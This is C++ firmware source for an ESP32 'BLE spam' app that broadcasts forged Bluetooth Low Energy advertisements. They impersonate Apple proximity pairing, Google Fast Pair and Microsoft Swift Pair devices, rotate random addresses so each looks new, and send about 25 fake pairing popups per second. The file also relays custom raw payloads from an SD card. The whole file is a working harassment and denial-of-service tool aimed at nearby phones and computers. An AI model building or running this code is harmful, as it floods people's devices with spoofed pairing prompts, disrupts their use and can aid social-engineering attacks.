#include "ep_app_blespam.hpp"
#include "ble_common.h"
#include "pp_commands.hpp"
#include "esp_log.h"
#include "esp_random.h"

extern "C" {
#include "host/ble_hs.h"
#include "host/util/util.h"
}

static const char* TAG = "blespam";
volatile uint32_t EPAppBleSpam::sentCount = 0;
uint8_t EPAppBleSpam::customData[EPAppBleSpam::MAX_CUSTOM][31] = {};
uint8_t EPAppBleSpam::customLen[EPAppBleSpam::MAX_CUSTOM] = {};
volatile uint8_t EPAppBleSpam::customCount = 0;

// ---- fake advertisement payload builders (raw AD structures) ----
static int build_apple(uint8_t* d) {
    static const uint8_t models[][2] = {
        {0x02, 0x20}, {0x0e, 0x20}, {0x0a, 0x20}, {0x0f, 0x20}, {0x13, 0x20}, {0x0b, 0x20}, {0x11, 0x20}};
    int m = esp_random() % (int)(sizeof(models) / sizeof(models[0]));
    int i = 0;
    d[i++] = 0x1e;  // AD length 30
    d[i++] = 0xff;  // manufacturer specific
    d[i++] = 0x4c;  // Apple
    d[i++] = 0x00;
    d[i++] = 0x07;  // proximity pairing
    d[i++] = 0x19;  // length
    d[i++] = 0x07;
    d[i++] = models[m][0];
    d[i++] = models[m][1];
    d[i++] = 0x55;  // status
    for (; i < 31; i++) d[i] = esp_random() & 0xff;
    return 31;
}

static int build_fastpair(uint8_t* d) {
    static const uint8_t ids[][3] = {
        {0xcd, 0x82, 0x56}, {0x0a, 0x0b, 0x85}, {0x2d, 0x7a, 0x23}, {0x9a, 0xdb, 0x11}, {0x00, 0x00, 0x07}};
    int m = esp_random() % (int)(sizeof(ids) / sizeof(ids[0]));
    int i = 0;
    d[i++] = 0x03;  // AD: complete list of 16-bit UUIDs
    d[i++] = 0x03;
    d[i++] = 0x2c;  // 0xFE2C Google Fast Pair
    d[i++] = 0xfe;
    d[i++] = 0x06;  // AD: service data
    d[i++] = 0x16;
    d[i++] = 0x2c;  // 0xFE2C
    d[i++] = 0xfe;
    d[i++] = ids[m][0];
    d[i++] = ids[m][1];
    d[i++] = ids[m][2];
    return i;
}

static int build_swiftpair(uint8_t* d) {
    char name[10];
    snprintf(name, sizeof(name), "PP-%04X", (unsigned)(esp_random() & 0xffff));
    int nl = (int)strlen(name);
    int i = 0;
    d[i++] = (uint8_t)(6 + nl);  // AD length
    d[i++] = 0xff;               // manufacturer specific
    d[i++] = 0x06;               // Microsoft
    d[i++] = 0x00;
    d[i++] = 0x03;  // beacon: Swift Pair
    d[i++] = 0x00;
    d[i++] = 0x80;  // flags
    memcpy(d + i, name, nl);
    i += nl;
    return i;
}

EPAppBleSpam::EPAppBleSpam() {
    ble_common_ensure_init();
    ESP_LOGI(TAG, "BLE spam app created");
}

EPAppBleSpam::~EPAppBleSpam() {
    if (active) ble_gap_adv_stop();
    active = false;
}

void EPAppBleSpam::Loop(uint32_t currentMillis) {
    if (!active || !ble_common_synced()) return;
    if (currentMillis - lastMs < 40) return;  // ~25 popups/sec
    lastMs = currentMillis;

    ble_gap_adv_stop();

    // fresh random static address each cycle => each looks like a new device
    uint8_t addr[6];
    esp_fill_random(addr, 6);
    addr[5] |= 0xC0;  // static random (top two bits set)
    ble_hs_id_set_rnd(addr);

    uint8_t data[31];
    int len = 0;
    if (mode == 4) {  // custom payloads from SD
        if (customCount == 0) return;
        int i = esp_random() % customCount;
        len = customLen[i];
        if (len < 1 || len > 31) return;
        memcpy(data, customData[i], len);
    } else {
        uint8_t use = (mode == 3) ? (esp_random() % 3) : mode;
        if (use == 0)
            len = build_apple(data);
        else if (use == 1)
            len = build_fastpair(data);
        else
            len = build_swiftpair(data);
    }

    if (ble_gap_adv_set_data(data, len) != 0) return;
    struct ble_gap_adv_params ap;
    memset(&ap, 0, sizeof(ap));
    ap.conn_mode = BLE_GAP_CONN_MODE_NON;  // non-connectable beacon
    ap.disc_mode = BLE_GAP_DISC_MODE_GEN;
    ap.itvl_min = 0x20;
    ap.itvl_max = 0x20;
    if (ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &ap, NULL, NULL) == 0)
        sentCount = sentCount + 1;
}

// IRQ CALLBACK
bool EPAppBleSpam::OnPPData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_BLESPAM_SET_MODE) {
        if (data.size() >= 1 && data[0] <= 3) mode = data[0];
        return true;
    } else if (command == PPCMD_BLESPAM_SET_ACTIVE) {
        if (data.size() >= 1) active = (data[0] != 0);
        return true;
    } else if (command == PPCMD_BLESPAM_ADD) {
        // [idx][off][bytes] — append bytes to one custom payload
        if (data.size() >= 3) {
            uint8_t idx = data[0], off = data[1];
            int n = (int)data.size() - 2;
            if (idx < MAX_CUSTOM && off + n <= 31) {
                memcpy(customData[idx] + off, data.data() + 2, n);
                if (off + n > customLen[idx]) customLen[idx] = off + n;
            }
        }
        return true;
    } else if (command == PPCMD_BLESPAM_COMMIT) {
        // [count] — activate that many custom payloads
        if (data.size() >= 1) {
            uint8_t c = data[0];
            customCount = (c <= MAX_CUSTOM) ? c : MAX_CUSTOM;
        }
        return true;
    } else if (command == PPCMD_BLESPAM_CLEAR_CUSTOM) {
        customCount = 0;
        memset(customLen, 0, sizeof(customLen));
        return true;
    }
    return false;
}

// IRQ CALLBACK
bool EPAppBleSpam::OnPPReqData(uint16_t command, std::vector<uint8_t>& data) {
    if (command == PPCMD_APPMGR_APPCMD) {
        data.resize(6);
        uint16_t* p = reinterpret_cast<uint16_t*>(data.data());
        p[0] = active ? 1 : 0;
        p[1] = mode;
        p[2] = (uint16_t)sentCount;
        return true;
    }
    return false;
}
